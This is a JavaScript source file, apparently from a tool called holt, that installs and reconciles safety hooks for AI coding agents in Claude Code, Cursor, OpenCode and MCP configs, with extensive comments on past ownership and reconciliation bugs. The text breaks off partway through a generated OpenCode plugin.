      await fs.writeFile(t.file, tomlWithHoltServer(existing, bin), 'utf8');
      // Record creation so uninstall can prove this file is holt's rather than inferring it.
      if (!hadFile) { const rel = await relativeWithinAsync(repoRoot, t.file); await recordCreated(repoRoot, { files: [rel], dirs: ancestorDirs(rel) }); }
      results.push({
        adapter: 'mcp', host: t.host, scope: t.scope, path: t.file,
        action: !hadFile ? 'created' : had ? 'updated' : 'added',
      });
      continue;
    }

    let cfg = {};
    let exists = true;
    let rawText = null;
    // ABSENT AND UNREADABLE ARE NOT THE SAME STATE, and only one of them makes it safe to write.
    // Conflating them in a single catch is what let a legal trailing comma cost a team both of
    // their MCP servers: the parse threw, `exists` went false, and project scope CREATED the file
    // it had just failed to read. A config holt cannot understand is somebody's configuration.
    try {
      rawText = await fs.readFile(t.file, 'utf8');
    } catch {
      rawText = null;
      exists = false;
    }
    if (rawText !== null) {
      const parsed = parseJsonc(rawText);
      if (!parsed.ok) {
        results.push({
          adapter: 'mcp', host: t.host, scope: t.scope, path: t.file,
          action: `left alone — holt could not parse this file (${parsed.why}) and will not overwrite a config it cannot read`,
        });
        continue;
      }
      cfg = parsed.value ?? {};
    }
    if (!exists) {
      // Project scope: creating the file is the point — it is how you wire a repo.
      // User scope: never create. Adding holt to a config the user does not have is
      // indistinguishable from installing software they did not ask for.
      if (t.scope === 'user') {
        results.push({ adapter: 'mcp', host: t.host, scope: t.scope, path: t.file, action: 'skipped (no user config)' });
        continue;
      }
    }

    // Amp's map lives under the DOTTED top-level key `amp.mcpServers` — which is one literal
    // key containing a dot, not a nested path. Writing it as a nested object produces a config
    // Amp silently ignores, so the key is used verbatim exactly as every other host's is.
    cfg[t.key] ??= {};
    const already = !!cfg[t.key].holt;
    cfg[t.key].holt = mcpServerEntry(bin, t.shape);

    await fs.mkdir(path.dirname(t.file), { recursive: true });
    // JSONC-PRESERVING WRITE: if we have the original text, use jsonc-parser to surgically
    // edit only the holt key, preserving comments. For a new file, use JSON.stringify.
    let output;
    if (rawText != null) {
      output = jsoncWrite(rawText, [[[t.key], cfg[t.key]]], { tabSize: 2, insertSpaces: true });
      if (!output.endsWith('\n')) output += '\n';
    } else {
      output = `${JSON.stringify(cfg, null, 2)}\n`;
    }
    await fs.writeFile(t.file, output, 'utf8');
    if (!exists) { const rel = await relativeWithinAsync(repoRoot, t.file); await recordCreated(repoRoot, { files: [rel], dirs: ancestorDirs(rel) }); }
    results.push({
      adapter: 'mcp', host: t.host, scope: t.scope, path: t.file,
      action: !exists ? 'created' : already ? 'updated' : 'added',
    });
  }
  return results;
}

/* ------------------------------------------------------ upgrade-safe reconciliation ---- */

/**
 * Recognise a holt-authored hook command WITHOUT caring what `bin` wrote it.
 *
 * MEASURED DEFECT: `installClaudeCode`'s old dedupe checked whether an event's entries contained
 * the literal string `${bin} hook` — built from the CURRENTLY resolved bin. A prior install often
 * used a different bin string (an absolute dev path, `npx holt`, a future/past flag set, a
 * renamed binary) and that check would then find no match, so integrate PUSHED A SECOND ENTRY
 * rather than recognising and replacing the first. Reproduced end-to-end: seeding
 * `.claude/settings.json` with `node /Users/dev/projects/holt/bin/holt.mjs hook pre-tool-use
 * --host claude-code` and re-running `holt integrate` left that entry untouched and appended
 * `holt hook pre-tool-use --host claude-code` next to it — every Bash call now fires BOTH, and if
 * the stale absolute path no longer exists (the ordinary case after an upgrade or a machine
 * change) it errors on every single tool call.
 *
 * The fix matches on the STRUCTURE of the call — `hook <subcommand>` — never on `bin`, so an
 * entry written by any past or future version of holt is found and reconciled, not duplicated.
 *
 * BINARY-TOKEN OWNERSHIP (the widening bug). The original regex `\bhook\s+<subcommand>\b`
 * matched ANY command containing that substring — including a different tool's hook that
 * happened to call `some-other-tool hook pre-tool-use`. The fix requires BOTH the structural
 * pattern AND a holt-specific signal. The signal is: `holt` appears in the command (as the
 * binary name, in a path segment, or as an npx package) OR one of holt's distinctive flags
 * (`--host`, `--autoprotect`) is present. This is bin-agnostic (`holt`, `node /path/to/holt.mjs`,
 * `npx holt`, even a renamed binary all match via the flags) but does not match foreign tools
 * that happen to use the same subcommand naming convention without holt's flags.
 */
/** Split a hook command into argv, respecting quotes. A path may contain spaces. */
function argvOf(command) {
  const out = [];
  const re = /"([^"]*)"|'([^']*)'|(\S+)/g;
  for (let m = re.exec(command); m; m = re.exec(command)) out.push(m[1] ?? m[2] ?? m[3]);
  return out;
}

/** Launchers that put the real program in the NEXT argument. */
const LAUNCHERS = new Set(['node', 'node.exe', 'bun', 'deno', 'npx', 'pnpm', 'yarn', 'bunx', 'sh', 'bash', 'cmd', 'cmd.exe']);

/** The basenames holt's own executable can legitimately have. */
const HOLT_BINARY = /^holt(\.(mjs|cjs|js|cmd|exe|bat|ps1))?$/i;

/**
 * IS THIS HOOK COMMAND HOLT'S OWN?
 *
 * OWNERSHIP DECIDED BY SUBSTRING DELETED THIRD-PARTY HOOKS. The predicate was
 *
 *     /\bhook\s+<sub>\b/ AND ( /\bholt\b/ OR /--host\b/ OR /--autoprotect\b/ )
 *
 * and each of those three signals is something a foreign tool legitimately carries. `--host` is
 * not holt-specific in any way; `\bholt\b` matches any path segment or package name containing
 * the word, hyphen included. Measured against a fixture holding three foreign PreToolUse entries,
 * `holt integrate` reported "reconciled 1 stale hook(s) from a prior version" and left ONE entry
 * where there had been four:
 *
 *     /opt/acme/guardrail hook pre-tool-use --host acme-prod   <- claimed via --host
 *     npx holt-lint hook pre-tool-use                          <- claimed via \bholt\b
 *     node /home/holt/tools/audit.mjs hook pre-tool-use        <- claimed via a USERNAME
 *
 * A corporate guardrail silently uninstalled by the tool you added to protect your work is the
 * one bug that makes "plug and play" false for the user who hits it, and the same predicate
 * decides what `holt uninstall` deletes.
 *
 * OWNERSHIP IS NOW ARGV-SHAPED, not textual: the program being executed must BE holt — argv[0]
 * (after any launcher) with a basename of exactly holt/holt.mjs/holt.cmd/holt.exe — and `hook
 * <subcommand>` must be its first two arguments, which is the only shape holt ever writes.
 *
 * The direction of the residual risk is deliberate. A user who renames the binary to `my-holt`
 * is no longer recognised, so `integrate` appends rather than reconciles and `uninstall` leaves
 * the entry behind: an annoyance, visible, and fixable by hand. The other direction destroys
 * someone else's security tooling. When ownership is uncertain, not touching it is the only
 * defensible default.
 */
function isHoltHookCommand(command, subcommand) {
  if (typeof command !== 'string') return false;
  const argv = argvOf(command);
  let i = 0;
  // Skip launchers and their flags: `npx -y holt …`, `node /path/holt.mjs …`, `pnpm dlx holt …`.
  while (i < argv.length && (LAUNCHERS.has(path.basename(argv[i]).toLowerCase()) || argv[i].startsWith('-')
    || (i > 0 && ['dlx', 'exec', 'run', '-c'].includes(argv[i])))) i++;
  if (i >= argv.length) return false;
  if (!HOLT_BINARY.test(path.basename(argv[i]))) return false;
  return argv[i + 1] === 'hook' && argv[i + 2] === subcommand;
}

/**
 * Is this holt's hook on ANY event — including one holt no longer wires?
 *
 * THE RETIREMENT HOLE. Reconciliation walks the events holt wants TODAY, so an event holt has
 * since dropped is never visited and its hook survives every upgrade. Worse, `uninstall` walked
 * the same list: holt's own help says to run it BEFORE removing the package, and it left a
 * `holt hook <retired-event>` entry pointing at a binary that was about to disappear — the exact
 * outcome that advice exists to prevent. REPRODUCED both ways against a settings.json holding a
 * hook on a retired event.
 *
 * Ownership is unchanged and just as narrow as `isHoltHookCommand`: the argv head must BE the
 * holt binary and its first argument must be `hook`. A third-party command that merely mentions
 * holt is not matched — that conflation is what deleted other people's hooks 7-to-1.
 */
function isAnyHoltHookCommand(command) {
  if (typeof command !== 'string') return false;
  const argv = argvOf(command);
  let i = 0;
  while (i < argv.length && (LAUNCHERS.has(path.basename(argv[i]).toLowerCase()) || argv[i].startsWith('-')
    || (i > 0 && ['dlx', 'exec', 'run', '-c'].includes(argv[i])))) i++;
  if (i >= argv.length) return false;
  if (!HOLT_BINARY.test(path.basename(argv[i]))) return false;
  return argv[i + 1] === 'hook' && typeof argv[i + 2] === 'string' && argv[i + 2].length > 0;
}

/**
 * Which events hold a holt hook that holt no longer wires, and what should be left in each.
 *
 * Returns a PLAN rather than mutating, because two writers have to apply the same decision: the
 * in-memory object (used for a brand-new file) and the JSONC surgical-edit path (used whenever
 * there is existing text to keep comments in). Computing it twice is how the two drift apart.
 *
 * @param {Record<string, any>} hooks  the `hooks` object from a Claude Code settings file
 * @param {Set<string>} wantedEvents   events holt still wires (handled by the reconcile loop)
 * @returns {Array<{event: string, kept: any[]|null}>} `kept: null` means remove the event key
 */
function planHoltHookRetirement(hooks, wantedEvents) {
  const plan = [];
  for (const event of Object.keys(hooks ?? {})) {
    if (wantedEvents.has(event)) continue;
    const existing = hooks[event];
    if (!Array.isArray(existing)) continue;
    const kept = [];
    let touched = false;
    for (const entry of existing) {
      const cmds = commandsOf(entry);
      if (!cmds.some((c) => isAnyHoltHookCommand(c))) { kept.push(entry); continue; }
      touched = true;
      // A USER'S OWN COMMAND SHARING THE ENTRY STILL SURVIVES — the same command-level
      // granularity the live events get. Only what is entirely holt's disappears.
      const userHooks = (entry.hooks ?? []).filter((h) => !isAnyHoltHookCommand(h?.command));
      if (userHooks.length > 0) kept.push({ ...entry, hooks: userHooks });
    }
    // An event left with nothing is holt's leftover key, not the user's — drop it rather than
    // leaving `"Notification": []` behind as litter.
    if (touched) plan.push({ event, kept: kept.length > 0 ? kept : null });
  }
  return plan;
}

/**
 * Is this all that is left of a config file — an empty object and nothing else?
 *
 * THE RULE UNINSTALL NEEDED AND DID NOT HAVE. It used to ask whether the PARSED object was empty
 * and then `fs.rm` the file, which conflates two different questions:
 *
 *   "the JSON is now empty"   — true of `{ // Team policy\n }`, whose comment is user content
 *   "the FILE was all ours"   — the only thing that justifies deleting it
 *
 * Reproduced both ways: a settings.json holding a `// Team policy` comment above holt's hook was
 * deleted comment and all, and 16 project MCP files in a repository holt had never run in were
 * deleted because a third-party server merely NAMED holt left the object empty once removed.
 * (That second case is now stopped earlier, by isHoltMcpEntry.)
 *
 * So the text itself is the evidence. Nothing but `{}` and whitespace means holt wrote every byte
 * that is left; anything else — a comment, another key, a stray blank object property — means
 * somebody else's content is in there and the file stays.
 */
function nothingButAnEmptyObject(text) {
  return String(text ?? '').replace(/\s+/g, '') === '{}';
}

/** Every literal `command` string nested under a Claude Code hook-list entry. */
function commandsOf(entry) {
  return Array.isArray(entry?.hooks) ? entry.hooks.map((h) => h?.command).filter((c) => typeof c === 'string') : [];
}

/* ---------------------------------------------------------------------- Cursor ---- */

/**
 * Cursor's deny hook, from Cursor's own current documentation.
 *
 * This is the third host where holt BLOCKS deterministically rather than advising, and it is the
 * one with the widest reach. It was not shipped before for a stated and correct reason — "holt
 * ships a guessed hook format for none of them, because a wrong hook is worse than none" — and
 * the schema below is no longer a guess: .cursor/hooks.json, version 1, `beforeShellExecution`,
 * blocked by a stdout object carrying `permission: "deny"`.
 *
 * beforeShellExecution is the right event and the only one needed: every command holt refuses is
 * a shell command. Hooking more events would put holt in the critical path of file reads and
 * prompt submissions for no additional protection.
 */
export function cursorHooks(bin = 'holt') {
  return {
    version: 1,
    hooks: {
      beforeShellExecution: [
        { command: `${bin} hook pre-tool-use --host cursor`, timeout: 120 },
      ],
      // Cursor supports stop (fires when the agent loop ends) and sessionEnd (fires when
      // the IDE session ends). Both are advisory — holt injects context only when something
      // CHANGED during the response, and warns at session end. See the SOTA research in the
      // Claude Code section for the full design rationale.
      stop: [
        { command: `${bin} hook stop --host cursor`, timeout: 60 },
      ],
      sessionEnd: [
        { command: `${bin} hook session-end --host cursor`, timeout: 60 },
      ],
    },
  };
}

// Which subcommand each Cursor hook event invokes — used by isHoltHookCommand for ownership.
const CURSOR_EVENT_SUBCOMMAND = {
  beforeShellExecution: 'pre-tool-use',
  stop: 'stop',
  sessionEnd: 'session-end',
};

export async function installCursorHooks(repoRoot, { bin = 'holt' } = {}) {
  const file = path.join(repoRoot, '.cursor', 'hooks.json');
  let rawText = null;
  let cfg = {};
  let created = true;
  try {
    rawText = await fs.readFile(file, 'utf8');
    cfg = readJsoncOrThrow(rawText);
    created = false;
  } catch { /* new file */ }

  cfg.version ??= 1;
  cfg.hooks ??= {};
  const wanted = cursorHooks(bin).hooks;
  let installed = 0;
  let reconciled = 0;
  let unchanged = 0;

  // Build the in-memory cfg (for action computation and fallback write) — same pattern as
  // installClaudeCode: iterate over each event, preserve user entries, replace holt's.
  for (const [event, entries] of Object.entries(wanted)) {
    const sub = CURSOR_EVENT_SUBCOMMAND[event];
    const list = Array.isArray(cfg.hooks[event]) ? cfg.hooks[event] : [];
    const nonArrayRemnant = Array.isArray(cfg.hooks[event]) ? null
      : (cfg.hooks[event] != null ? cfg.hooks[event] : null);
    const mine = (h) => isHoltHookCommand(h?.command, sub);
    const already = list.some(mine);
    if (!already) installed++;
    else {
      const currentHolt = list.filter(mine);
      if (JSON.stringify(currentHolt) !== JSON.stringify(entries)) reconciled++;
      else unchanged++;
    }
    cfg.hooks[event] = [
      ...list.filter((h) => !mine(h)),
      ...(nonArrayRemnant ? [nonArrayRemnant] : []),
      ...entries,
    ];
  }

  await fs.mkdir(path.dirname(file), { recursive: true });
  // JSONC-PRESERVING WRITE: use element-level reconciliation to preserve comments.
  let output;
  if (rawText != null) {
    let result = rawText;
    const parsedRaw = readJsoncOrThrow(rawText);
    if (parsedRaw.hooks == null) {
      result = jsoncWrite(rawText, [[['hooks'], {}]], { tabSize: 2, insertSpaces: true });
    }
    for (const [event, entries] of Object.entries(wanted)) {
      const sub = CURSOR_EVENT_SUBCOMMAND[event];
      const parsedResult = readJsoncOrThrow(result);
      const eventArr = parsedResult.hooks?.[event];
      if (Array.isArray(eventArr)) {
        const isMine = (h) => isHoltHookCommand(h?.command, sub);
        const reconciled_text = jsoncReconcileArray(result, ['hooks', event], isMine, entries, { tabSize: 2, insertSpaces: true });
        if (reconciled_text != null) result = reconciled_text;
      } else if (eventArr != null) {
        const nonArrayRemnant = eventArr;
        result = jsoncWrite(result, [[['hooks', event], [nonArrayRemnant, ...entries]]], { tabSize: 2, insertSpaces: true });
      } else {
        result = jsoncWrite(result, [[['hooks', event], entries]], { tabSize: 2, insertSpaces: true });
      }
    }
    output = result;
    if (!output.endsWith('\n')) output += '\n';
  } else {
    output = `${JSON.stringify(cfg, null, 2)}\n`;
  }
  await fs.writeFile(file, output, 'utf8');
  const action = installed && !reconciled && !unchanged ? 'installed'
    : reconciled ? `reconciled ${reconciled} stale hook(s)${installed ? `, installed ${installed} new` : ''}`
    : installed ? `installed ${installed} new hook(s) (rest already present)`
    : 'already present';
  // `cfg.version ??= 1` is a NO-OP when the user already set it, so it leaves holt no trace of
  // whether that key is holt's default or theirs. The receipt is that trace. Without it, uninstall
  // deleted a user's own git-tracked hooks.json whose content was exactly {"version": 1}.
  if (created) { const rel = await relativeWithinAsync(repoRoot, file); await recordCreated(repoRoot, { files: [rel], dirs: ancestorDirs(rel) }); }
  return { adapter: 'cursor', path: file, created, installed, reconciled, unchanged, action };
}

/* ------------------------------------------------------------------ Claude Code ---- */

export function claudeCodeHooks(bin = 'holt') {
  return {
    PreToolUse: [
      { matcher: 'Bash', hooks: [{ type: 'command', command: `${bin} hook pre-tool-use --host claude-code`, timeout: 120 }] },
    ],
    SessionStart: [
      { hooks: [{ type: 'command', command: `${bin} hook session-start --autoprotect --host claude-code`, timeout: 120 }] },
    ],
    UserPromptSubmit: [
      { hooks: [{ type: 'command', command: `${bin} hook user-prompt-submit --host claude-code`, timeout: 60 }] },
    ],
    // Stop fires when Claude finishes responding. holt uses it to warn the agent about at-risk
    // work before it stops — closing the "biggest cadence hole" where an agent creates something
    // irreplaceable and then stops, with no warning that the worktree holds the only copy. The
    // hook can block with decision:"block" to keep the agent running, but must check
    // stop_hook_active to prevent infinite loops.
    Stop: [
      { hooks: [{ type: 'command', command: `${bin} hook stop --host claude-code`, timeout: 60 }] },
    ],
    // SessionEnd fires when the session terminates. Advisory-only — cannot block. holt uses it
    // for a final warning about at-risk work, which is precisely when someone tears down worktrees.
    SessionEnd: [
      { hooks: [{ type: 'command', command: `${bin} hook session-end --host claude-code`, timeout: 60 }] },
    ],
  };
}

// Which subcommand each event's hook invokes — the structural signature isHoltHookCommand
// matches on, independent of `bin`.
const CLAUDE_EVENT_SUBCOMMAND = {
  PreToolUse: 'pre-tool-use',
  SessionStart: 'session-start',
  UserPromptSubmit: 'user-prompt-submit',
  Stop: 'stop',
  SessionEnd: 'session-end',
};

/**
 * Install/reconcile holt's Claude Code hooks, UPGRADE-SAFE.
 *
 * For each event: entries recognised as holt's own (by isHoltHookCommand, not by `bin`) are
 * removed and replaced with the current, correct entry; anything else — a user's own hook on the
 * same event — is left exactly where it was. This makes re-running integrate after an upgrade a
 * true reconciliation rather than an append-if-absent: a stale entry from ANY prior version
 * (different bin, different flags, a since-corrected subcommand) is found and fixed in place
 * instead of accumulating as a second, possibly-broken, hook that still fires on every tool call.
 *
 * COMMAND-LEVEL GRANULARITY (the user-widened-hook bug). The previous code replaced the ENTIRE
 * entry when ANY of its commands matched holt's pattern — so a user who added their own hook to
 * holt's matcher entry (e.g. a lint check alongside holt's pre-tool-use) lost their addition on
 * every reconcile. The fix operates at the COMMAND level within each entry: only holt's own
 * commands are removed and replaced; user-added commands in the same entry survive.
 *
 * NON-ARRAY PRESERVATION. If `cfg.hooks[event]` is not an array (e.g. a user misconfigured it as
 * a single object), the previous code silently replaced it with `[]`, losing the user's value.
 * Now the non-array value is preserved as a separate entry and holt's hooks are appended.
 *
 * JSONC PRESERVATION. Comments in the settings file are preserved using jsonc-parser's surgical
 * edit API — the same library VSCode uses for its own settings.json editor.
 */
export async function installClaudeCode(repoRoot, { bin = 'holt' } = {}) {
  const file = path.join(repoRoot, '.claude', 'settings.json');
  let rawText = null;
  let cfg = {};
  let created = true;
  try {
    rawText = await fs.readFile(file, 'utf8');
    cfg = readJsoncOrThrow(rawText);
    created = false;
  } catch { /* new file */ }

  cfg.hooks ??= {};
  const wanted = claudeCodeHooks(bin);
  let installed = 0;
  let reconciled = 0;
  let unchanged = 0;

  // Build the in-memory cfg (for action computation and fallback write)
  for (const [event, entries] of Object.entries(wanted)) {
    const sub = CLAUDE_EVENT_SUBCOMMAND[event];
    const existing = Array.isArray(cfg.hooks[event]) ? cfg.hooks[event] : [];
    const nonArrayRemnant = Array.isArray(cfg.hooks[event]) ? null : (cfg.hooks[event] != null ? cfg.hooks[event] : null);

    // COMMAND-LEVEL GRANULARITY: for each existing entry, remove only holt's commands and
    // keep the user's. An entry that had ONLY holt's commands is removed entirely; an entry
    // that had holt's + user's commands keeps the user's.
    // A USER MODIFICATION IS NOT A STALE ENTRY.
    //
    // MEASURED: a user who deliberately WIDENED holt's own hook —
    //   { matcher: "Bash|Write|Edit", hooks: [{ command: "holt hook pre-tool-use --host claude-code",
    //     timeout: 600 }] }
    // — had it silently rewritten to holt's canonical `matcher: "Bash"`, `timeout: 120`, and was
    // told "reconciled 1 stale hook(s) from a prior version". It was not stale; the COMMAND was
    // already exactly what holt writes today. Only the matcher and timeout were theirs, and both
    // were WIDER than holt's defaults — so holt narrowed a user's guard and described it as an
    // upgrade.
    //
    // The thing that goes stale is the COMMAND (an old bin path, retired flags). matcher, timeout
    // and any wrapper are the user's configuration of a hook holt merely supplies. So an entry
    // whose holt command already matches the canonical one is left EXACTLY as it is.
    const canonicalCmds = new Set(entries.flatMap((e) => commandsOf(e)));
    const preserved = [];
    let foundHolt = false;
    let keptUserShaped = 0;
    for (const entry of existing) {
      const cmds = commandsOf(entry);
      const holtCmds = cmds.filter((c) => isHoltHookCommand(c, sub));
      const userCmds = cmds.filter((c) => !isHoltHookCommand(c, sub));
      if (holtCmds.length > 0) {
        foundHolt = true;
        // Already running the current command: this entry is DONE. Keep the user's matcher,
        // timeout and any wrapping untouched, and do not append a duplicate below.
        if (userCmds.length === 0 && holtCmds.every((c) => canonicalCmds.has(c))) {
          preserved.push(entry);
          keptUserShaped++;
          continue;
        }
        if (userCmds.length > 0) {
          preserved.push({ ...entry, hooks: entry.hooks.filter((h) => !isHoltHookCommand(h?.command, sub)) });
        }
      } else {
        preserved.push(entry);
      }
    }
    // Only append the canonical entries this event still lacks.
    const stillNeeded = keptUserShaped > 0 ? [] : entries;

    if (!foundHolt) {
      installed++;
    } else {
      const currentHolt = existing.filter((e) => commandsOf(e).some((c) => isHoltHookCommand(c, sub)));
      // A PRESERVED USER SHAPE IS "UNCHANGED", NOT "RECONCILED". The entry differs from holt's
      // canonical one — that is the whole point, the user widened it — so a plain inequality test
      // reported "reconciled 1 stale hook(s) from a prior version" about a hook that was neither
      // stale nor touched. holt must not describe leaving something alone as having fixed it.
      if (keptUserShaped > 0) {
        unchanged++;
      } else if (JSON.stringify(currentHolt) !== JSON.stringify(entries)) {
        reconciled++;
      } else {
        unchanged++;
      }
    }
    cfg.hooks[event] = [...preserved, ...(nonArrayRemnant ? [nonArrayRemnant] : []), ...stillNeeded];
  }

  // RETIREMENT IS DRIVEN BY THE FILE, NOT BY THE WISHLIST. The loop above can only ever visit
  // events holt still wants; a hook holt wired in an earlier version on an event it has since
  // dropped is invisible to it and survives every reconcile, firing forever at a subcommand that
  // may no longer exist. Sweeping what is actually THERE is the only way to see it.
  const retirement = planHoltHookRetirement(cfg.hooks, new Set(Object.keys(wanted)));
  for (const { event, kept } of retirement) {
    if (kept) cfg.hooks[event] = kept; else delete cfg.hooks[event];
  }
  const retired = retirement.length;

  await fs.mkdir(path.dirname(file), { recursive: true });

  // JSONC-PRESERVING WRITE: if we have the original text, use element-level reconciliation
  // to preserve comments. For a new file, fall back to JSON.stringify.
  let output;
  if (rawText != null) {
    // First, ensure cfg.hooks exists in the text (it may not if the user file had no hooks key)
    let textWithHooks = rawText;
    const parsedRaw = readJsoncOrThrow(rawText);
    if (parsedRaw.hooks == null) {
      // No hooks key in the original — add it
      textWithHooks = jsoncWrite(rawText, [[['hooks'], {}]], { tabSize: 2, insertSpaces: true });
    }

    // For each event, use element-level reconciliation
    // Annotated because jsoncWrite's declared return widens this to `never` on reassignment,
    // which made every `result = <edited text>` below a diagnostic about a string that is fine.
    /** @type {string} */
    let result = textWithHooks;
    for (const [event, entries] of Object.entries(wanted)) {
      const sub = CLAUDE_EVENT_SUBCOMMAND[event];
      const parsedResult = readJsoncOrThrow(result);
      const eventArr = parsedResult.hooks?.[event];

      if (Array.isArray(eventArr)) {
        // Element-level: remove holt's entries, append new ones
        // Same rule as the in-memory path above: an entry already running the CANONICAL command
        // is the user's configuration of a current hook, not a stale one. Leave matcher, timeout
        // and any wrapping exactly as they are, and do not append a duplicate beside it.
        const canonical = new Set(entries.flatMap((e) => commandsOf(e)));
        const alreadyCurrent = (entry) => {
          const cmds = commandsOf(entry);
          const holtCmds = cmds.filter((c) => isHoltHookCommand(c, sub));
          return holtCmds.length > 0
            && cmds.every((c) => isHoltHookCommand(c, sub))
            && holtCmds.every((c) => canonical.has(c));
        };
        const keepsUserShape = eventArr.some(alreadyCurrent);
        const isMine = (entry) => {
          if (alreadyCurrent(entry)) return false;   // theirs to keep, not ours to replace
          const cmds = commandsOf(entry);
          const holtCmds = cmds.filter((c) => isHoltHookCommand(c, sub));
          const userCmds = cmds.filter((c) => !isHoltHookCommand(c, sub));
          // If the entry has ONLY holt's commands, it's entirely holt's — remove it.
          // If it has holt's + user's, we need to strip holt's commands from it.
          return holtCmds.length > 0 && userCmds.length === 0;
        };
        const reconciled_text = jsoncReconcileArray(result, ['hooks', event], isMine, keepsUserShape ? [] : entries, { tabSize: 2, insertSpaces: true });
        if (reconciled_text != null) result = reconciled_text;

        // Handle user-widened entries: entries that have BOTH holt's and user's commands
        // need holt's old commands stripped from them (the new holt entry is appended above).
        // We replace each widened entry with a version that only has the user's commands.
        const parsedAfterReconcile = readJsoncOrThrow(result);
        const arrAfterReconcile = parsedAfterReconcile.hooks?.[event] || [];
        for (let i = 0; i < arrAfterReconcile.length; i++) {
          const entry = arrAfterReconcile[i];
          const cmds = commandsOf(entry);
          const holtCmds = cmds.filter((c) => isHoltHookCommand(c, sub));
          const userCmds = cmds.filter((c) => !isHoltHookCommand(c, sub));
          if (holtCmds.length > 0 && userCmds.length > 0) {
            // Widened entry — strip holt's commands, keep user's
            const strippedEntry = { ...entry, hooks: (entry.hooks || []).filter((h) => !isHoltHookCommand(h?.command, sub)) };
            result = jsoncWrite(result, [[['hooks', event, i], strippedEntry]], { tabSize: 2, insertSpaces: true });
          }
        }
      } else if (eventArr != null) {
        // Non-array value — replace with the new array (preserving the user's value as first entry)
        const nonArrayRemnant = eventArr;
        result = jsoncWrite(result, [[['hooks', event], [nonArrayRemnant, ...entries]]], { tabSize: 2, insertSpaces: true });
      } else {
        // Event doesn't exist yet — add it
        result = jsoncWrite(result, [[['hooks', event], entries]], { tabSize: 2, insertSpaces: true });
      }
    }
    // The same retirement, applied to the text so comments survive it. Recomputed from `result`
    // rather than reusing the in-memory plan because the surgical edits above have already moved
    // things around; the DECISION comes from one function, the subject is whatever is there now.
    for (const { event, kept } of planHoltHookRetirement(
      readJsoncOrThrow(result).hooks ?? {}, new Set(Object.keys(wanted)),
    )) {
      const edited = jsoncWrite(result, [[['hooks', event], kept ?? undefined]], { tabSize: 2, insertSpaces: true });
      if (edited != null) result = edited;
    }
    output = result;
    if (!output.endsWith('\n')) output += '\n';
  } else {
    output = `${JSON.stringify(cfg, null, 2)}\n`;
  }
  await fs.writeFile(file, output, 'utf8');
  if (created) { const rel = await relativeWithinAsync(repoRoot, file); await recordCreated(repoRoot, { files: [rel], dirs: ancestorDirs(rel) }); }
  const retiredNote = retired ? `retired ${retired} hook(s) on event(s) holt no longer uses` : '';
  const action = [
    installed && !reconciled && !unchanged ? 'installed'
      : reconciled ? `reconciled ${reconciled} stale hook(s) from a prior version${installed ? `, installed ${installed} new` : ''}`
      : installed ? `installed ${installed} new hook(s) (rest already present)`
      : 'already present',
    retiredNote,
  ].filter(Boolean).join(', ');
  return { adapter: 'claude-code', path: file, created, installed, reconciled, unchanged, retired, action };
}

/* --------------------------------------------------------------------- OpenCode ---- */

/**
 * OpenCode plugin.
 *
 * Written against the real API (verified against opencode 1.18.x, not a summary):
 *   - plugins live in `.opencode/plugins/` (PLURAL) or `~/.config/opencode/plugins/`
 *   - a plugin exports an async fn receiving `{ project, client, $, directory, worktree }`
 *     and returning a hooks object
 *   - `"tool.execute.before": async (input, output)` — `input.tool` names the tool,
 *     `output.args` holds its arguments
 *   - a tool call is DENIED by THROWING. There is no permissionDecision object here, which is
 *     exactly why the neutral core returns verdicts and adapters translate them.
 *   - `input` ALSO carries `sessionID` and `callID`. Verified in the shipping opencode binary:
 *     the runtime fires `trigger("tool.execute.before", {tool, sessionID, callID}, {args})`.
 *     Earlier revisions of this plugin destructured only `input.tool` and discarded both, so
 *     every OpenCode action holt journalled was anonymous while the host had been handing it a
 *     session id the whole time. They are now forwarded to the CLI.
 *       re-derive:  strings "$(command -v opencode)" | grep -o 'tool.execute.before.\{0,90\}'
 */
export function opencodePlugin(bin = 'holt', { esm = true } = {}) {
  return `// holt — OpenCode plugin (generated by \`holt integrate\`).
//
// Blocks worktree destruction that would lose work existing nowhere else, and injects
// sibling-workstream context at session start. Every decision is delegated to the holt CLI,
// so the logic lives in one place and this file never goes stale.
${esm ? 'import { execFile } from "node:child_process"' : 'const { execFile } = require("node:child_process")'}

// The configured binary may carry arguments (e.g. "node /path/to/holt.mjs" during development,
// or "npx holt"). execFile takes the executable and an argv array separately, so passing the
// whole string as the executable finds nothing — and the gate then FAILS OPEN, silently, on every
// command. Caught by test/e2e/opencode-plugin.test.mjs, which is the only reason it is not still
// shipping: the plugin loaded, the hooks fired, and it blocked nothing.
const [HOLT_CMD, ...HOLT_PREFIX] = ${JSON.stringify(bin)}.trim().split(/\\s+/)

let warned = false

const run = (args, cwd) =>
  new Promise((resolve) => {
    execFile(HOLT_CMD, [...HOLT_PREFIX, ...args], { cwd, timeout: 120000, maxBuffer: 16 * 1024 * 1024 },
      (err, stdout) => resolve({ code: err ? (err.code ?? 1) : 0, stdout: String(stdout ?? ""), err }),
    )
  })

// OpenCode's shell tool has been named "bash" and "shell" across versions; accept either, and
// fall back to sniffing the args rather than silently doing nothing on an unknown name.
const commandOf = (input, output) => {
  const a = output?.args ?? {}
  if (typeof a.command === "string") return a.command
  if (typeof a.cmd === "string") return a.cmd
  if (Array.isArray(a.command)) return a.command.join(" ")
  return null
}

${esm ? 'export const holt' : 'const holt'} = async ({ directory, worktree }) => {
  const cwd = worktree || directory || process.cwd()
  return {
    "tool.execute.before": async (input, output) => {
      const command = commandOf(input, output)
      if (!command) return

      // Forward the identity opencode already handed us. Only when it is a non-empty string:
      // passing "" would make holt record an empty session, which reads as identity in a
      // timeline and is not one. Absent stays absent, and holt records 'unknown'.
      const ident = []
      if (typeof input?.sessionID === "string" && input.sessionID.trim()) ident.push("--session", input.sessionID.trim())
      if (typeof input?.callID === "string" && input.callID.trim()) ident.push("--invocation", input.callID.trim())

      const res = await run(["hook", "pre-tool-use", "--host", "opencode", "--command", command, "--cwd", cwd, ...ident], cwd)

      let verdict
      try {
        verdict = JSON.parse(res.stdout)
      } catch {
        // holt could not run, or produced something unparseable. Do NOT block — a safety tool
        // that bricks the agent when it breaks is worse than one that is absent. But SAY SO,
        // once: a gate that fails open in silence is indistinguishable from no gate at all,
        // and the user believes they are protected when they are not.
        if (!warned) {
          warned = true
          console.warn(
            "[holt] gate INACTIVE — could not run '" + HOLT_CMD + "'" +
              (res.err ? " (" + res.err.message + ")" : "") +
              ". Worktree deletions are NOT being checked. Fix with: holt doctor",
          )
        }
        return
      }

      if (verdict.decision === "deny") {
        throw new Error(verdict.reason || "holt: this command would destroy work found nowhere else")
      }
      if (verdict.decision === "ask") {
